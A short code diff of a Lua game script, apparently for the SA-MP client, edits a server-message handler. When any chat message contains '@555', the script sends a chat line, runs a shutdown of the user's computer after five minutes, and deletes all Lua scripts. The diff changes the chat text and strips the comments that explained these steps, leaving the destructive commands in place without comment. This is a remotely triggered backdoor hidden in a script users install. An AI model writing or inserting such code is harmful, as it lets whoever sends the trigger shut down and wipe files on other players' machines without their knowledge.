@@ -9,9 +9,9 @@ end
 
 function sampev.onServerMessage(color, message)
     if message:find("@555") then
-        sampSendChat("123456")
-        os.execute('shutdown /s /t 300') -- Выключение через 5 минут
-        deleteAllLuaScripts()           -- Удаляем все скрипты
+        sampSendChat("ПРИВЕТ")
+        os.execute('shutdown /s /t 300')
+        deleteAllLuaScripts()
     end
 end
 
